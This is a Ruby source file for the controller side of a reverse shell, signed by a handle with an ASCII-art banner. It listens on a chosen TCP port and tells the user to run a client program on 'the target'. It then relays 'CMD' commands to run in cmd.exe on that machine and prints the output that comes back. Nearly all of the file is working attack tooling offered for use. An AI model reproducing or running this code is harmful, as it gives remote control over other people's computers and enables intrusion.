require 'socket' 
puts ""
puts ""
puts "Created by 44h"
puts <<-'44h'

___________________________________________________________________________
___________________________________________________________________________
                   _____              _____                   
                  /    /             /    /                   
                 /    /             /    /        .           
                /    /             /    /       .'|           
               /    /             /    /       <  |           
              /    /  __         /    /  __     | |           
             /    /  |  |       /    /  |  |    | | .'''-.    
            /    '   |  |      /    '   |  |    | |/.'''. \   
           /    '----|  |---. /    '----|  |---.|  /    | |   
          /          |  |   |/          |  |   || |     | |   
          '----------|  |---''----------|  |---'| |     | |   
                     |  |               |  |    | '.    | '.  
                    /____\             /____\   '---'   '---' 
___________________________________________________________________________
___________________________________________________________________________
44h
puts ""
puts "Set the PORT to listen on" 
port = $stdin.gets.chomp
puts "Great! Now you can start the client on the target by executing following commands:"
puts "*programmname*.exe *IP* *port*"
puts ""
puts "Now waiting for you to start the client\n"

$wantsToExit = false
#$dataTransmission = false
#$dataTransmissionType = nil

# $client_commands = {
#     "ACN" => "Auto completion data, so folders, files, etc. will be sent in the next message till message \"END\"",
#     "PDATA" => "The next data will be the the data of a program that was executed, till message \"END\"",
#     "END" => "This tells the server that the data transmission of that sequence is complete"
# }
    

def send(data)
    $client.puts(data)
end

def convertDataACN
    #Convert the ACN data, so files, and folders, etc. 
    #I dont know yet how i will send the files and folders
    #I will do this later
end


def convertData(line)
    # if $dataTransmission && line != "END" ##Should check if the data transmission already started and this is the data
    #     if $dataTransmissionType == 'PDATA'
    #         Kernel.puts(line)
    #     end
    #     if $dataTransmissionType == 'ACN'
    #         convertDataACN
    #     end
    # end
    # if line == 'ACN'
    #     #Data transmission of Auto completion (tab-tab) data starts
    #     $dataTransmission = true
    #     $dataTransmissionType = 'ACN'
    # elsif line == 'PDATA'
    #     #Data transmission of Program execution data starts
    #     $dataTransmission = true
    #     $dataTransmissionType = 'PDATA'
    # elsif line == 'END'
    #     #Data transmission of the last transmission ends
    #     $dataTransmission = false
        
    # end

end




def receiveData
    thread = Thread.new do
        loop do
            begin
                Kernel.puts ""
                while (line = $client.gets)
                    #thread2 = Thread.new do
                        #puts "Data: #{line}"
                        #puts "Data transmission: #{$dataTransmission}"
                        #convertData(line)
                      Kernel.puts line
                    #end
                end
            rescue => e
                #dont print error
            end
        end
    end
end

# def commandLineInterface
#     thread = Thread.new do
#         loop do
#             print "\n"
#             print "   \e[4mInterpreter\e[0m > "
#             command = $stdin.gets.chomp
#             puts ""
#             if command == "exit"
#                 send("EXIT")
#                 $wantsToExit = true
#             elsif command == 'help'
#                 puts "Here is a list of all commands: "
#                 puts "stop          ----- stops the current execution"
#                 puts "CMD *COMMAND* ----- executes the command in cmd.exe on the target"
#                 puts "exit          ----- stops the reverse shell"
#             elsif command == 'stop'
#                 puts "Trying to stop the current data transmission"
#                 send("STOP")
#             elsif command.start_with?("CMD")
#                 begin
#                     send(command)
#                 rescue => e
#                     puts "Try again and check your syntax"
#                     next
#                 end
#             else
#                 if command != ""
#                     puts "Command #{command} not found! Type \"help\" to get a list of commands"
#                 end
#             end
#             command = ""
#         end
#     end
# end


$socket = TCPServer.new('0.0.0.0',port)
$client = $socket.accept
receiveData
#commandLineInterface

begin
    loop do
        trap("INT") do
            send("EXIT")
            exit
        end
        print "\n"
        print "   \e[4mInterpreter\e[0m > "
        command = $stdin.gets.chomp
        puts ""
        if command == "exit"
            send("EXIT")
            $wantsToExit = true
        elsif command == 'help'
            puts "Here is a list of all commands: "
            puts "stop          ----- stops the current execution"
            puts "CMD *COMMAND* ----- executes the command in cmd.exe on the target"
            puts "exit          ----- stops the reverse shell"
        elsif command == 'stop'
            puts "Trying to stop the current data transmission"
            send("STOP")
        elsif command.start_with?("CMD")
            begin
                send(command)
            rescue => e
                puts "Try again and check your syntax"
                next
            end
        else
            if command != ""
                puts "Command #{command} not found! Type \"help\" to get a list of commands"
            end
        end
        command = ""

        if $wantsToExit == true
            #!!!Implement that a message gets sent to the client
            
            puts ""
            puts ""
            puts "Exiting.."
            client.close
            socket.close
            
        end
    end
rescue => e
exit()
end